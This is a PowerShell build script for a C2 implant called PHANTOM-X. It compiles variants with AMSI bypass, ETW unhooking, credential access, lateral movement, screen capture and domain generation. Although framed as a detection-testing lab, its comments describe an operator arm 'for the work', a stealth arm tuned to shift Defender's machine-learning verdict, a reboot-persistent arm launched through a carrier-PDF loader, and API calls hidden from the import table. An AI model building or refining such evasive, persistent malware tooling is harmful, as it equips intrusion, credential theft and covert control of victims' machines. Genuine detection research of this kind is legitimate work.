#Requires -Version 5.1
<#
.SYNOPSIS
    PHANTOM-X :: build the variant matrix.

.DESCRIPTION
    Builds the baseline arm and each variant arm, so that the lab can
    compare them.

    WHY A MATRIX
        The lab's question is never "does this technique work". It is
        always "what changes when this technique is used", and that can
        only be answered by running both arms and diffing the telemetry.

        So the build produces a set of binaries, one per arm:

            px_payload_baseline.exe   plain, every capability off
            px_payload_obfuscate.exe  strings encoded
            px_payload_amsi.exe       AMSI bypass
            px_payload_etw.exe        ETW unhooked
            px_payload_encrypt.exe    encrypted channel
            px_payload_dga.exe        domain generation
            px_payload_cred.exe       credential access
            px_payload_lateral.exe    lateral movement
            px_payload_caps.exe       the capability library
            px_payload_full.exe       everything on at once

        The "full" arm is the one the detection rules are finally
        validated against: it is the worst case a defender has to be
        able to catch.

    EACH ARM IS A SEPARATE BINARY
        The capabilities are compiled in or out, not switched at
        runtime. A capability that is not compiled in cannot be
        detected, and "present but disabled" is not the same thing as
        "not present". A single binary with a runtime switch would not
        give the lab the clean comparison it needs.

    THE STRING TABLE
        The obfuscated arm needs the generated string table. It is
        regenerated here so that the arm always matches the current
        source, and so that a stale table cannot silently produce a
        binary with half its strings still in the clear.

.PARAMETER OutputDir
    Where the variant binaries go.

.PARAMETER C2Host
    The C2 address baked into the payload. The PX_C2_HOST environment
    variable overrides it at runtime.

.PARAMETER C2Port
    The C2 port baked into the payload.

.EXAMPLE
    .\build_variants.ps1 -OutputDir ..\..\dist\variants
#>
[CmdletBinding()]
param(
    [string]$OutputDir = '',
    [string]$C2Host = '127.0.0.1',
    [int]$C2Port = 9001
)

$ErrorActionPreference = 'Continue'
$here = $PSScriptRoot
$root = Split-Path (Split-Path $here -Parent) -Parent

if (-not $OutputDir) {
    $OutputDir = Join-Path $root 'dist\variants'
}
New-Item -ItemType Directory -Force -Path $OutputDir | Out-Null

function Write-Section {
    param([string]$Text)
    Write-Host ''
    Write-Host ('=' * 70) -ForegroundColor DarkGray
    Write-Host $Text -ForegroundColor Cyan
    Write-Host ('=' * 70) -ForegroundColor DarkGray
}

# ---------------------------------------------------------------------------
# Toolchain
# ---------------------------------------------------------------------------
function Find-MSVC {
    $vswhere = "${env:ProgramFiles(x86)}\Microsoft Visual Studio\Installer\vswhere.exe"
    if (-not (Test-Path $vswhere)) { return $null }
    $path = & $vswhere -latest -products * `
        -requires Microsoft.VisualStudio.Component.VC.Tools.x86.x64 `
        -property installationPath
    if (-not $path) { return $null }
    $vcvars = Join-Path $path 'VC\Auxiliary\Build\vcvars64.bat'
    if (Test-Path $vcvars) { return $vcvars }
    return $null
}

$vcvars = Find-MSVC
if (-not $vcvars) {
    Write-Host '[!] MSVC not found. Install the Visual Studio Build Tools.' -ForegroundColor Red
    exit 1
}
$lines = & cmd.exe /c "`"$vcvars`" && set" 2>$null
foreach ($l in $lines) {
    if ($l -match '^([^=]+)=(.*)$') {
        Set-Item -Path "Env:$($matches[1])" -Value $matches[2] -ErrorAction SilentlyContinue
    }
}

$sdk = Get-ChildItem 'C:\Program Files (x86)\Windows Kits\10\Include' -Directory -ErrorAction SilentlyContinue |
       Sort-Object Name -Descending | Select-Object -First 1
if (-not $sdk) {
    Write-Host '[!] Windows SDK headers not found.' -ForegroundColor Red
    exit 1
}

# ---------------------------------------------------------------------------
# Regenerate the string table
# ---------------------------------------------------------------------------
Write-Section 'string table'

Push-Location $here
try {
    $python = Get-Command python.exe -ErrorAction SilentlyContinue
    if (-not $python) { $python = Get-Command python3.exe -ErrorAction SilentlyContinue }
    if ($python) {
        & $python.Source (Join-Path $here 'tools\gen_strings.py') `
            --def (Join-Path $here 'px_strings.def') `
            --out (Join-Path $here 'px_strings.h') 2>&1 | Out-String | Write-Host
        if ($LASTEXITCODE -ne 0) {
            Write-Host '[!] string table generation failed.' -ForegroundColor Red
            exit 1
        }
    } else {
        Write-Host '    no Python; using the checked-in string table' -ForegroundColor Yellow
    }
} finally {
    Pop-Location
}

# ---------------------------------------------------------------------------
# The arms
# ---------------------------------------------------------------------------
# Each arm is a set of /D flags. The baseline has none.
$arms = [ordered]@{
    'baseline'  = @()
    'obfuscate' = @('PX_OBFUSCATE=1')
    'amsi'      = @('PX_AMSI_BYPASS=1')
    'etw'       = @('PX_ETW_UNHOOK=1')
    'encrypt'   = @('PX_ENCRYPT=1')
    'dga'       = @('PX_DGA=1')
    'cred'      = @('PX_CRED_ACCESS=1')
    'lateral'   = @('PX_LATERAL=1')
    'resilient' = @('PX_RESILIENT=1')
    'xfer'      = @('PX_FILE_TRANSFER=1', 'PX_SCREENSHOT=1')
    'caps'      = @('PX_CAPABILITIES=0x3FFFFF')
    # Everything EXCEPT domain generation.
    #
    # The DGA arm REPLACES the C2 host with a generated name, so it
    # cannot be pointed at an address -- which makes the 'full' arm
    # awkward for the operator side, where you want to say "run this
    # and point it at my server".
    #
    # This arm carries every other capability in one binary: the
    # obfuscated strings, the AMSI bypass, the ETW unhook, the
    # encrypted channel, the credential access, the lateral movement,
    # the reconnect, the file transfer, the screen capture and the
    # whole technique library.
    #
    # The cost of having them all at once is the same one the 'full'
    # arm has: the telemetry is one blob, so you cannot tell which
    # technique produced which signal. Use the matrix for the
    # measurement and this arm for the work.
    'all'       = @('PX_OBFUSCATE=1', 'PX_AMSI_BYPASS=1', 'PX_ETW_UNHOOK=1',
                    'PX_ENCRYPT=1', 'PX_CRED_ACCESS=1',
                    'PX_LATERAL=1', 'PX_RESILIENT=1', 'PX_FILE_TRANSFER=1',
                    'PX_SCREENSHOT=1', 'PX_CAPABILITIES=0x3FFFFF')
    # The stealth arm: the technique-heavy arm with the ARTEFACTS off.
    #
    # The endpoint's machine-learning verdict on this payload arrives at
    # EXECUTION. What it reads first is a fresh unsigned binary that
    # creates two text files next to itself and then opens a socket to
    # an unusual port. That is a textbook trojan opening move.
    #
    # This arm turns the artefacts off -- no marker file, no log file --
    # and delays the first connection, so the shape changes. It does NOT
    # remove a single technique, so the detection rules still have
    # behaviour to match.
    #
    # Whether it works is a MEASUREMENT, not a claim: the lab runs the
    # arm and asks Defender what it thinks.
    'stealth'   = @('PX_OBFUSCATE=1', 'PX_AMSI_BYPASS=1', 'PX_ETW_UNHOOK=1',
                    'PX_ENCRYPT=1', 'PX_CRED_ACCESS=1',
                    'PX_LATERAL=1', 'PX_RESILIENT=1', 'PX_FILE_TRANSFER=1',
                    'PX_SCREENSHOT=1', 'PX_CAPABILITIES=0x3FFFFF',
                    'PX_STEALTH=1', 'PX_STEALTH_DELAY=20')
    # The persistent arm: the stealth arm, and the session survives a
    # reboot.
    #
    # The capability library's `persist` technique writes a Run key and
    # then REMOVES it, because a lab technique that leaves litter is not
    # a lab technique. That is right for a measurement and wrong for an
    # instrument that has to come back after a reboot.
    #
    # This arm installs the key on the first connection and LEAVES it,
    # and reports the command that removes it. The key points at the
    # loader with the carrier PDF as its argument, because an in-memory
    # payload has no image of its own -- the loader tells it where the
    # document is.
    'persistent' = @('PX_OBFUSCATE=1', 'PX_AMSI_BYPASS=1', 'PX_ETW_UNHOOK=1',
                    'PX_ENCRYPT=1', 'PX_CRED_ACCESS=1',
                    'PX_LATERAL=1', 'PX_RESILIENT=1', 'PX_FILE_TRANSFER=1',
                    'PX_SCREENSHOT=1', 'PX_CAPABILITIES=0x3FFFFF',
                    'PX_STEALTH=1', 'PX_STEALTH_DELAY=20',
                    'PX_PERSISTENT=1')
    'full'      = @('PX_OBFUSCATE=1', 'PX_AMSI_BYPASS=1', 'PX_ETW_UNHOOK=1',
                    'PX_ENCRYPT=1', 'PX_DGA=1', 'PX_CRED_ACCESS=1',
                    'PX_LATERAL=1', 'PX_RESILIENT=1', 'PX_FILE_TRANSFER=1',
                    'PX_SCREENSHOT=1', 'PX_CAPABILITIES=0x3FFFFF')
}

$built = @()
$failed = @()

Write-Section 'building the arms'

foreach ($arm in $arms.Keys) {
    $defs = $arms[$arm]
    $obj = "px_payload_$arm.obj"
    $exe = "px_payload_$arm.exe"
    $out = Join-Path $OutputDir $exe

    Push-Location $here
    try {
        # The command is assembled for cmd.exe.
        #
        # The /D define carries a quoted string, and the quoting has to
        # survive two parsers: PowerShell's, which builds the command,
        # and cmd.exe's, which runs it and hands the result to cl.exe.
        #
        # cmd.exe strips unescaped double quotes, so the quotes have to
        # reach the MSVC preprocessor as \" -- the backslash-quote form
        # the preprocessor understands. PowerShell does not treat a
        # backslash as an escape character (the escape is a backtick),
        # so in a single-quoted PowerShell string \" is exactly two
        # characters and passes through untouched.
        $cmd = 'cl.exe /nologo /O2 /W4 /GS- /Zl /Gs999999999 /c px_payload.c'
        $cmd += ' /DPX_DEFAULT_HOST=\"' + $C2Host + '\"'
        $cmd += ' /DPX_DEFAULT_PORT=' + $C2Port
        foreach ($d in $defs) { $cmd += ' /D' + $d }
        $cmd += ' /Fo' + $obj

        # The compile output is captured so that a failure can be
        # reported with the reason, rather than as a bare "FAIL".
        $compileOut = & cmd.exe /c $cmd 2>&1 | Out-String
        if ($LASTEXITCODE -ne 0) {
            Write-Host ("    FAIL {0}: compile" -f $arm) -ForegroundColor Red
            Write-Host $compileOut -ForegroundColor DarkGray
            $failed += $arm
            continue
        }

        # gdi32 and user32 are needed by the screen capture arm. Linking
        # them unconditionally keeps every arm's link line identical,
        # which is one fewer thing to differ between builds.
        #
        # advapi32 is NOT here, and that is deliberate: the registry and
        # the token API are resolved at runtime, so the import table does
        # not name them. An import table that says "RegCreateKeyExA" is
        # not a list of API calls -- it is a description of the
        # behaviour, and a defender reads it before the program does
        # anything at all.
        & cmd.exe /c "link.exe /nologo /NOENTRY /ENTRY:px_entry /SUBSYSTEM:CONSOLE /OUT:$exe $obj ws2_32.lib kernel32.lib gdi32.lib user32.lib /NODEFAULTLIB" 2>&1 | Out-Null
        if ($LASTEXITCODE -ne 0) {
            Write-Host ("    FAIL {0}: link" -f $arm) -ForegroundColor Red
            $failed += $arm
            continue
        }

        Copy-Item (Join-Path $here $exe) $out -Force
        $size = (Get-Item $out).Length
        Write-Host ("    OK   {0,-10} {1,7} bytes -> {2}" -f $arm, $size, $out) -ForegroundColor Green
        $built += $arm
    } finally {
        Pop-Location
        Remove-Item (Join-Path $here $obj) -ErrorAction SilentlyContinue
        Remove-Item (Join-Path $here $exe) -ErrorAction SilentlyContinue
    }
}

# ---------------------------------------------------------------------------
# Verify the obfuscation arm actually removed the strings
# ---------------------------------------------------------------------------
Write-Section 'verifying the obfuscation arm'

$obfExe = Join-Path $OutputDir 'px_payload_obfuscate.exe'
$baseExe = Join-Path $OutputDir 'px_payload_baseline.exe'

if ((Test-Path $obfExe) -and (Test-Path $baseExe)) {
    $needles = @('HELLO|', 'RESULT|', 'ws2_32.dll', 'PX_C2_HOST', 'kernel32.dll',
                 'ntdll.dll', 'AmsiScanBuffer', 'EtwEventWrite', 'schtasks.exe',
                 'lsass.exe', 'cmd /c ', 'EXIT', 'PING', 'PONG', 'EXEC|', 'CRED|',
                 'LATERAL|', 'CAPS|', 'amsi.dll', 'CAP|', 'DL|', 'SHOT|')

    function Find-Bytes {
        param([byte[]]$Hay, [string]$Needle)
        $pat = [System.Text.Encoding]::ASCII.GetBytes($Needle)
        if ($pat.Length -eq 0 -or $Hay.Length -lt $pat.Length) { return $false }
        for ($i = 0; $i -le $Hay.Length - $pat.Length; $i++) {
            $m = $true
            for ($j = 0; $j -lt $pat.Length; $j++) {
                if ($Hay[$i + $j] -ne $pat[$j]) { $m = $false; break }
            }
            if ($m) { return $true }
        }
        return $false
    }

    $obfBytes = [System.IO.File]::ReadAllBytes($obfExe)
    $baseBytes = [System.IO.File]::ReadAllBytes($baseExe)

    $leaked = @()
    $visibleInBaseline = 0
    foreach ($n in $needles) {
        if (Find-Bytes -Hay $obfBytes -Needle $n) { $leaked += $n }
        if (Find-Bytes -Hay $baseBytes -Needle $n) { $visibleInBaseline++ }
    }

    Write-Host ("    baseline : {0}/{1} needles visible" -f $visibleInBaseline, $needles.Count) -ForegroundColor Gray
    if ($leaked.Count -eq 0) {
        Write-Host '    obfuscate: no needle found -- the arm is clean' -ForegroundColor Green
    } else {
        Write-Host ("    obfuscate: LEAKED -> {0}" -f ($leaked -join ', ')) -ForegroundColor Red
        $failed += 'obfuscate (leaked strings)'
    }
}

# ---------------------------------------------------------------------------
# Summary
# ---------------------------------------------------------------------------
Write-Section 'summary'
Write-Host "  output: $OutputDir" -ForegroundColor White
Write-Host ''
foreach ($a in $built) { Write-Host ("    + {0}" -f $a) -ForegroundColor Green }
if ($failed.Count) {
    Write-Host ''
    foreach ($f in $failed) { Write-Host ("    ! {0}" -f $f) -ForegroundColor Red }
}

Write-Host ''
Write-Host '  The arms are the EXPERIMENT. Compare them:' -ForegroundColor White
Write-Host '    baseline  = what a defender sees against a plain payload' -ForegroundColor DarkGray
Write-Host '    <arm>     = what they see against that technique' -ForegroundColor DarkGray
Write-Host '    the difference is the finding, and it is about the RULE,' -ForegroundColor DarkGray
Write-Host '    not about the payload.' -ForegroundColor DarkGray
Write-Host ''

if ($failed.Count) { exit 1 }
exit 0
